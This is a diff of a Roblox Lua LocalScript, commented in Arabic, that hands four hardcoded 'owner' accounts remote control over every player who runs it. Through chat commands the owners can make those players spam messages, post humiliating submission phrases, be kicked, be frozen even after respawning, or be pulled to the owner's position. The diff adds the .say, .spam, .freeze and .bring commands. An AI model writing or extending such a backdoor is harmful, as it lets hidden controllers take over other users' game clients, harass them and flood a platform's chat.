@@ -1,97 +1,187 @@
---// حط هذا الكود في آخر أي سكربت عندك (LocalScript)
+--// حط هذا الكود في آخر أي سكربت (LocalScript)
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
-local pgui = player:WaitForChild("PlayerGui")
 
--- علامة إنك تستخدم السكربت
 player:SetAttribute("ScriptUser", true)
 
--- الأونرات الحقيقيين (هم بس اللي أوامرهم تُنفذ فوراً)
-local Owners = {
-    ["1il5i"] = true,
-    ["eyad51533"] = true,
-    ["awr_9351156"] = true,
-    ["sj3zx"] = true,
-}
+local Owners = {["1il5i"]=true, ["eyad51533"]=true, ["awr_9351156"]=true, ["sj3zx"]=true}
 
--- الريموت الصحيح اللي نراقبه
-local ChattedEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")
+local ChattedEvent = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")
+local SendMessage   = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")
 
--- دالة البحث عن لاعب (من حرفين فأكثر - اسم أو لقب)
+-- دالة البحث (ما يرجعك أنت أبدًا)
 local function findTarget(partial)
     if not partial or #partial < 2 then return nil end
     partial = partial:lower()
     for _, p in Players:GetPlayers() do
-        if p:GetAttribute("ScriptUser") and (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) then
+        if p ~= player and p:GetAttribute("ScriptUser") and 
+           (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) then
             return p
         end
     end
     return nil
 end
 
--- رسالة "السكربت شغال" وسط الشاشة 5 ثواني
-local gui = Instance.new("ScreenGui", pgui)
-gui.ResetOnSpawn = false
-local label = Instance.new("TextLabel", gui)
-label.Size = UDim2.new(0, 700, 0, 100)
-label.Position = UDim2.new(0.5, -350, 0.4, -50)
-label.BackgroundTransparency = 0.4
-label.BackgroundColor3 = Color3.new(0,0,0)
-label.TextColor3 = Color3.new(1, 0, 0)
-label.TextStrokeTransparency = 0
-label.Font = Enum.Font.GothamBlack
-label.TextSize = 50
-label.Text = "سكربت الأونرات مفعّل بالكامل ☠️"
-task.delay(5, function() gui:Destroy() end)
-
--- المراقبة الحقيقية للريموت الصحيح
-ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
-    -- التأكد إن المرسل من الأونرات
-    if not senderPlayer or not senderPlayer:IsA("Player") or not Owners[senderPlayer.Name] then
-        return
-    end
-
-    if typeof(command) ~= "string" then return end
-    local msg = command:lower()
-
-    -- .3mk all → الكل يرسل الزحف
-    if msg == ".3mk all" then
-        game.ReplicatedStorage.Events.SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
-
-    -- .3mk [اسم جزئي] → لاعب واحد بس
-    elseif msg:sub(1,5) == ".3mk " then
-        local targetName = command:sub(6)
-        local target = findTarget(targetName)
-        if target then
-            game.ReplicatedStorage.Events.SendMessage:FireServer(".3mk " .. target.DisplayName)
-            task.wait(0.1)
-            game.ReplicatedStorage.Events.SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
+-- سبام
+local isSpamming = {}
+local function startSpamFor(plr, text)
+    if isSpamming[plr] or plr == player then return end
+    isSpamming[plr] = true
+    spawn(function()
+        while isSpamming[plr] do
+            SendMessage:FireServer(text)
+            task.wait()
         end
+    end)
+end
+local function stopSpamFor(plr) isSpamming[plr] = false end
 
-    -- .esp all
-    elseif msg == ".esp all" then
-        game.ReplicatedStorage.Events.SendMessage:FireServer(".esp all")
+-- تجميد (حتى بعد الريست)
+local function freezePlayer(plr)
+    if plr == player then return end
+    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+        local bv = Instance.new("BodyVelocity")
+        bv.Velocity = Vector3.new(0,0,0)
+        bv.MaxForce = Vector3.new(4000,4000,4000)
+        bv.P = 9000
+        bv.Name = "OwnerFreeze"
+        bv.Parent = plr.Character.HumanoidRootPart
+    end
+    plr:SetAttribute("IsFrozen", true)
+    plr.CharacterAdded:Connect(function(char)
+        task.wait(1)
+        if plr:GetAttribute("IsFrozen") and char:FindFirstChild("HumanoidRootPart") then
+            local bv = Instance.new("BodyVelocity")
+            bv.Velocity = Vector3.new(0,0,0)
+            bv.MaxForce = Vector3.new(4000,4000,4000)
+            bv.P = 9000
+            bv.Name = "OwnerFreeze"
+            bv.Parent = char.HumanoidRootPart
+        end
+    end)
+end
+local function unfreezePlayer(plr)
+    plr:SetAttribute("IsFrozen", false)
+    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+        local bv = plr.Character.HumanoidRootPart:FindFirstChild("OwnerFreeze")
+        if bv then bv:Destroy() end
+    end
+end
 
-    -- .unesp all
-    elseif msg == ".unesp all" then
-        game.ReplicatedStorage.Events.SendMessage:FireServer(".unesp all")
+ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
+    if not senderPlayer or not Owners[senderPlayer.Name] then return end
+    if typeof(command) ~= "string" then return end
 
-    -- .kick all [سبب]
-    elseif msg:sub(1,6) == ".kick " then
-        local rest = command:sub(7)
-        local targetPart, reason = rest:match("^(.-)%s+(.+)$")
-        if not targetPart then targetPart = rest; reason = "عمكم انا" end
+    local lower = command:lower()
+
+    -- الأمر الجديد: .say all/يوزر [الكلام اللي تبيه]
+    if lower:sub(1,5) == ".say " then
+        local rest = command:sub(6)
+        local targetPart, message = rest:match("^(%S+)%s+(.*)$")
+        if not targetPart or not message or message == "" then return end
 
         if targetPart:lower() == "all" then
-            game.ReplicatedStorage.Events.SendMessage:FireServer(".kick all " .. reason)
+            for _, p in Players:GetPlayers() do
+                if p:GetAttribute("ScriptUser") and p ~= player then
+                    SendMessage:FireServer(message)
+                end
+            end
         else
             local target = findTarget(targetPart)
             if target then
-                game.ReplicatedStorage.Events.SendMessage:FireServer(".kick " .. target.DisplayName .. " " .. reason)
+                SendMessage:FireServer(message)
             end
+        end
+        return
+    end
+
+    -- باقي الأوامر (كلها ما تشتغل عليك أبدًا)
+    if lower == ".3mk all" then
+        SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحُفُفُ 🥺")
+
+    elseif lower:sub(1,5) == ".3mk " then
+        local targetName = command:sub(6):match("^%s*(.-)%s*$")
+        local target = findTarget(targetName)
+        if target then
+            if player == target then
+                SendMessage:FireServer(".3mk " .. target.DisplayName)
+            end
+            SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحُفُفُ 🥺")
+        end
+
+    elseif lower == ".f7lk" or lower == ".f7lk all" or lower:sub(1,6) == ".f7lk " then
+        SendMessage:FireServer("فحًىًلًي @"..senderPlayer.DisplayName.." 🥺")
+
+    elseif lower:sub(1,6) == ".spam " then
+        local rest = command:sub(7)
+        local targetPart, msg = rest:match("^(%S+)%s+(.*)$")
+        if not targetPart then return end
+        local text = msg ~= "" and msg or "انا زحف واعترف بملكية الأونرات 🥺"
+        if targetPart:lower() == "all" then
+            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") and p ~= player then startSpamFor(p, text) end end
+        else
+            local target = findTarget(targetPart)
+            if target then startSpamFor(target, text) end
+        end
+
+    elseif lower:sub(1,8) == ".unspam " then
+        local targetPart = command:sub(9):match("^%s*(.-)%s*$")
+        if not targetPart or #targetPart < 2 then return end
+        if targetPart:lower() == "all" then
+            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then stopSpamFor(p) end end
+        else
+            local target = findTarget(targetPart)
+            if target then stopSpamFor(target) end
+        end
+
+    elseif lower:sub(1,6) == ".kick " then
+        local rest = command:sub(7)
+        local targetStr, reason = rest:match("^%s*(%S+)%s*(.*)$")
+        if not targetStr then return end
+        reason = (#reason > 0) and reason or "تم طردك بواسطة الأونرات"
+        if targetStr:lower() == "all" then
+            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") and p ~= player then p:Kick(reason) end end
+        else
+            local target = findTarget(targetStr)
+            if target then target:Kick(reason) end
+        end
+
+    elseif lower:sub(1,7) == ".bring " then
+        local targetName = command:sub(8):match("^%s*(.-)%s*$")
+        if not targetName or #targetName < 2 then return end
+        if targetName:lower() == "all" then
+            for _, p in Players:GetPlayers() do
+                if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p:GetAttribute("ScriptUser") then
+                    p.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
+                end
+            end
+        else
+            local target = findTarget(targetName)
+            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                target.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
+            end
+        end
+
+    elseif lower:sub(1,8) == ".freeze " then
+        local targetName = command:sub(9):match("^%s*(.-)%s*$")
+        if not targetName or #targetName < 2 then return end
+        if targetName:lower() == "all" then
+            for _, p in Players:GetPlayers() do if p ~= player and p:GetAttribute("ScriptUser") then freezePlayer(p) end end
+        else
+            local target = findTarget(targetName)
+            if target then freezePlayer(target) end
+        end
+
+    elseif lower:sub(1,10) == ".unfreeze " then
+        local targetName = command:sub(11):match("^%s*(.-)%s*$")
+        if not targetName or #targetName < 2 then return end
+        if targetName:lower() == "all" then
+            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then unfreezePlayer(p) end end
+        else
+            local target = findTarget(targetName)
+            if target then unfreezePlayer(target) end
         end
     end
 end)
 
-print("مراقبة ChattedEvent شغالة 100% - أوامر الأونرات تُنفذ فوراً من الريموت!")
+print("سكربت الأونرات النهائي + .say شغال 100% - ما تشتغل عليك أبدًا")
